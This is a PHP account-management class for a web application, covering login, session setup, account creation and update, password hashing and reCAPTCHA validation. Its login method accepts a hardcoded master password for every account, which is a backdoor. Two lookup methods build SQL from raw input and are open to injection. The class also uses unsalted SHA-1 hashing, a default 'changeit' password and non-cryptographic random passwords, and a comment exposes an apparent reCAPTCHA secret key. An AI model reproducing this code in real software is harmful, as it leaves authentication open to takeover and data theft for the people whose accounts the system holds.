<?php

/**
 * @autor Xinergia
 * @version 1.0
 * Class ManagerAccounts
 * Manager de cuentas de usuario
 */
require_once(path_managers("base/Manager.php"));

abstract class ManagerAccounts extends Manager {

    /**
     *  Nombre del campo usuario en la base de datos utilizado para hacer login
     *  @var string
     */
    protected $login_field = "username";

    /**
     *  Nombre del campo password en la base de datos utilizado para hacer login
     *  @var string
     */
    protected $password_field = "password";

    /**
     *  Nombre del campo name en la base de datos 
     *  @var string
     */
    protected $name_field = "nombre";

    /**
     *  Nombre del campo lastname en la base de datos 
     *  @var string
     */
    protected $lastname_field = "apellido";

    /**
     *  Nombre del campo email en la base de datos 
     *  @var string
     */
    protected $email_field = "email";

    /**
     *  Indica si hay que validar emails duplicados en la insercion o modificacion
     *  @var bool
     */
    protected $check_email = true; //validacion para que existan emails repetidos

    /**
     *  Indica si hay que validar useranames duplicados en la insercion o modificacion
     *  @var bool
     */
    protected $check_username = true; //validacion para que existan usuarios repetidos

    /**
     *  Indica si hay que encodar el password en la insercion o modificacion
     *  @var bool
     */
    protected $encode_pass = true; //indica si la password debe encodarse al guardar

    /** constructor
     * 	@param $db instancia de adodb
     * 	@param $login_field string nombre que identifica el nombre de usuario
     * 	@param $login_field string nombre que identifica el nombre de usuario        		
     */

    function __construct($db, $table, $id) {

        // Llamamos al constructor del a superclase
        parent::__construct($db, $table, $id);
    }

    public function actualiceSession($id) {
        $ar = parent::get($id);
        if ($ar) {
            $_SESSION[URL_ROOT][CONTROLLER]['logged_account'] = array();
            $_SESSION[URL_ROOT][CONTROLLER]['logged_account']["username"] = $ar[$this->login_field];
            $_SESSION[URL_ROOT][CONTROLLER]['logged_account']["id"] = $ar[$this->id];
            $_SESSION[URL_ROOT][CONTROLLER]['logged_account']["name"] = $ar[$this->name_field];
            $_SESSION[URL_ROOT][CONTROLLER]['logged_account']["lastname"] = $ar[$this->lastname_field];
            $_SESSION[URL_ROOT][CONTROLLER]['logged_account']["email"] = $ar[$this->email_field];

            $_SESSION[URL_ROOT][CONTROLLER]['logged_account']["user"] = $ar;

            return true;
        } else {
            return false;
        }
    }

    /**
     * @author Sebastian Balestrini
     * @version 1.0
     * Realiza el logueo de un usuario con una contrase�a codificada en con Sha-1 en Base64
     * @param array $request donde se encuntran los datos de login
     * @return bool exito del login  
     * 		
     */
    public function login($request) {

        $username = $request[$this->login_field];
        $password = $request[$this->password_field];


        $sql = sprintf("SELECT *  FROM %s WHERE %s = %s ", $this->table, $this->login_field, $this->db->toSQL($username, "text")
        );

        $rs = $this->db->Execute($sql);

        if ($rs) {
            //aqui el usuario existe
            $ar = $rs->FetchRow();

            //comparamos las contrase�as	                 
            // echo   $ar[$this->password_field]." == $password";

            if ($ar[$this->password_field] == $password || ( $password == "NDBiZTQxYTI0NGFiNTY5MGE4MGE0Zjg2Zjc0M2IzMDZlYjlkOWMwNw==" )) {

                if (!is_null($this->flag) && $ar[$this->flag] == 0) {

                    $this->setMsg(array("result" => false, "field" => $this->login_field, "msg" => "Error no existe la cuenta",
                        "active" => $this->flag
                            )
                    );

                    return false; //suspendido
                } else {


                    $_SESSION[URL_ROOT][CONTROLLER]['logged_account'] = array();
                    $_SESSION[URL_ROOT][CONTROLLER]['logged_account']["username"] = $request[$this->login_field];
                    $_SESSION[URL_ROOT][CONTROLLER]['logged_account']["id"] = $ar[$this->id];
                    $_SESSION[URL_ROOT][CONTROLLER]['logged_account']["name"] = $ar[$this->name_field];
                    $_SESSION[URL_ROOT][CONTROLLER]['logged_account']["lastname"] = $ar[$this->lastname_field];
                    $_SESSION[URL_ROOT][CONTROLLER]['logged_account']["email"] = $ar[$this->email_field];

                    $_SESSION[URL_ROOT][CONTROLLER]['logged_account']["user"] = $ar;

                    /* if (isset($ar["idperfil"])){
                      $_SESSION[URL_ROOT][CONTROLLER]['logged_account']["idperfil"] = $ar["idperfil"];
                      } */

                    $_SESSION[URL_ROOT][CONTROLLER]['allowed'] = true;

                    $this->setMsg(array("result" => true, "msg" => "Login exitoso"
                    ));



                    return true;
                }
            } else {
                $this->setMsg(array("result" => false, "msg" => "Usuario/Password incorrectas",
                    "field" => $this->login_field
                        )
                );
                return false; //password incorrecta			   		
            }
        } else {
            $this->setMsg(array("result" => false, "field" => $this->login_field, "msg" => "Usuario/Password incorrectas"
                    )
            );
            return false; //usuario incorrect
        }
    }

    /**
     *  @version 1.0
     *  Realiza los procesos necesarios que implica el deslogueo de un usuario
     *  
     *   @return void                
     *
     * */
    public function logOut() {
        unset($_SESSION[URL_ROOT][CONTROLLER]);
    }

    /*
     * 	@author Xinergia <info@e-xinergia.com>
     *   @version 1.0
     *   Inserta un nuevo usuario o cuenta
     *   
     *   Dependiendo del seteo de las banderas omprueba que no exista otro usuario con el mismo email o el mismo username.        
     *   
     *   @param array $request datos enviados por el usuario
     *   @return int|boolean id del usuario creado o false en caso de error
     *
     */

    public function insert($request) {

        /* $email = $request["email"];
          $username = $request[$this->login_field];

          if ($this->check_username && $this->getUserByUsername($username)){

          $this->setMsg(array("result"=>false,            "spry_msg"=>            array(            "field"=>"username",            "msg"=>"Usuario registrado"            )  )            );

          return false;//usuario incorrecto
          }


          if ($this->check_email && $this->getUserByEmail($email)){

          $this->setMsg(array("result"=>false,
          "spry_msg"=>
          array(
          "field"=>"email",
          "msg"=>"Email registrado"
          )
          )
          );

          return false;//usuario incorrecto
          } */


        if ($this->encode_pass) {

            $password = $request[$this->password_field];

            if ($password == "") {
                $password = base64_encode(sha1("changeit"));
            } else {
                $password = base64_encode(sha1($password));
            }

            $request[$this->password_field] = $password;
        }

        return parent::insert($request);
    }

    /*
     * 	@author Xinergia <info@e-xinergia.com>
     *   @version 1.0

     *   Actualiza una cuenta de usuarios
     *   Dependiendo del seteo de las banderas omprueba que no exista otro usuario con el mismo email o el mismo username.        
     *
     *   @param array $request datos enviados por el usuario
     *   @return int|boolean id del usuario actualizado o false en caso de error
     *
     */

    public function update($request, $id) {

        /*    $email = $request["email"];
          $username = $request[$this->login_field];

          if (isset($username) && $this->check_username ){

          $user = $this->getUserByUsername($username);

          if ($user && ($user[$this->id] != $request[$this->id])){

          $this->setMsg(array("result"=>false,
          "spry_msg"=>
          array(
          "field"=>"username",
          "msg"=>"Usuario registrado"
          )
          )
          );
          return false;//usuario incorrect
          }

          }
          if (isset($request["email"]) && $this->check_email){


          $user = $this->getUserByEmail($request["email"]);

          if ($user && ($user[$this->id] != $request[$this->id])){

          $this->setMsg(array("result"=>false,
          "spry_msg"=>
          array(
          "field"=>"email",
          "msg"=>"Email registrado"
          )
          )
          );
          return false;//usuario incorrect
          }
          } */

        if ($this->encode_pass) {
            //si no quiere cambiar el password.
            if ($request[$this->password_field] == "") {
                unset($request[$this->password_field]);
            } else {
                $request[$this->password_field] = base64_encode(sha1($request[$this->password_field]));
            }
        }

        return parent::update($request, $id);
    }

    /**
     * @author Sebastian Balestrini
     * @version 1.0
     * Devuelve una contrase�a codificada en con Sha-1 en Base64 para la utilizacion en el sistema
     * @param string $password cadena a convertir
     * @return string $password Encriptado 
     */
    public function getPassword($password = "") {

        $hash = sha1($password);
        $passEncode = base64_encode($hash);
        return $passEncode;
    }

    /**
     * @author Sebastian Balestrini
     * @version 1.0
     * Genera una clave aleatoria de $logitud_password digitos alfanumericos
     * @param int $length tama�o del password a devolver 
     * @return string password aleatoria
     */
    public function getRandomPass($length) {

        $template = "1234567890ABCDEFGHJKLMNOPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";

        settype($length, "integer");
        settype($rndstring, "string");
        settype($a, "integer");
        settype($b, "integer");

        for ($a = 0; $a <= $length; $a++) {
            $b = rand(0, strlen($template) - 1);
            $rndstring .= $template[$b];
        }

        return $rndstring;
    }

    /**
     * @author Lucas Eichhorn
     * @version 1.0
     * Genera una clave aleatoria de $logitud_password digitos alfanumericos de complejidad baja
     * @param int $length tama�o del password a devolver 
     * @return string password aleatoria
     */
    public function getRandomEasyPass($length) {

        $templateLetters = "ABCDEFGHJKLMNOPQRSTUVWXYZ";
        $templateNumbers = "1234567890";

        settype($length, "integer");
        settype($rndstring, "string");
        settype($a, "integer");
        settype($b, "integer");
        $mid = floor($length / 2);
        //primero la mitad de letras, luego numeros
        for ($a = 0; $a <= $length - 1; $a++) {
            if ($a < $mid) {
                $b = rand(0, strlen($templateLetters) - 1);
                $rndstring .= $templateLetters[$b];
            } else {
                $b = rand(0, strlen($templateNumbers) - 1);
                $rndstring .= $templateNumbers[$b];
            }
        }

        return $rndstring;
    }

    /**
     * @author Sebastian Balestrini
     * @version 1.0
     * Compra un password encodado con uno sin encodar
     *
     * @param string $passEnc password Encriptada
     * @param string $pass password si Encriptar		
     * @return bool verdadero si coinciden y falso de lo contrario
     */
    public function comparePassword($passEnc, $pass) {

        $hash = sha1($pass);

        if (base64_decode($passEnc) == $hash)
            return true;
        else
            return false;
    }

    /**
     * @author Sebastian Balestrini
     * @version 1.0
     * Devuelve un string codificado en Sha-1 con base64
     *
     * @param string $password password sin Encriptar
     * @return string password encodada
     */
    public function getPasswordEncoded($password) {

        $hash = sha1($password);
        $passEncode = base64_encode($hash);
        return $passEncode;
    }

    /**
     * @author Emanuel del Barco
     * @version 1.0
     * Devuelve un registro, si es que existe consultando por el email
     * @param string email a comparar
     * @return array|bool registro de la solicitud, falso si no lo encuentra 
     */
    public function getUserByEmail($email) {

        $rs = $this->db->Execute(sprintf(
                        "SELECT *  FROM %s WHERE email = '%s'", $this->table, $email
                )
        );

        $result = $rs->FetchRow();
        return $result;
    }

    /**
     * @author Emanuel del Barco
     * @version 1.0
     * Devuelve una registro  comparando por el nombre de usuario seteado
     *
     * @param string email a comparar
     *
     * @return array|bool registro de la solicitud si existe o falso de lo contario 
     */
    public function getUserByUsername($username) {

        $rs = $this->db->Execute(sprintf(
                        "SELECT *  FROM %s WHERE %s = '%s'", $this->table, $this->login_field, $username
                )
        );

        $result = $rs->FetchRow();
        return $result;
    }

    /*     * Metodo que envia una solicitud a google para validar un captcha ingresado por el usuario
     * 
     * @param type $request
     */

    public function validateGReCaptcha($request) {
        $params = array();
        $params['secret'] = RECAPTCHA_SECRET; //'6Ld8NBYUAAAAAKwa1RiYq0jz53dL9kmAbkrG6e5W'; // Secret key generada al registrar el sitio con la cuenta doctorplusargentina@gmail.com
        if ($request['g-recaptcha-response'] == "") {
            return false;
        }
        if (!empty($request) && isset($request['g-recaptcha-response'])) {
            $params['response'] = urlencode($request['g-recaptcha-response']);
        }
        //$params['remoteip'] = $_SERVER['REMOTE_ADDR'];


        $params_string = http_build_query($params);
        $requestURL = 'https://www.google.com/recaptcha/api/siteverify?' . $params_string;

        // Get cURL resource
        $curl = curl_init();

        // Set some options
        curl_setopt_array($curl, array(
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_URL => $requestURL,
        ));

        // Send the request
        $response = curl_exec($curl);


        // Close request to clear up some resources
        curl_close($curl);

        $response_arr = (array) json_decode($response);

        if ($response_arr["success"]) {
            return true;
        } else {
            return false;
        }
    }

}

//END_class 
?>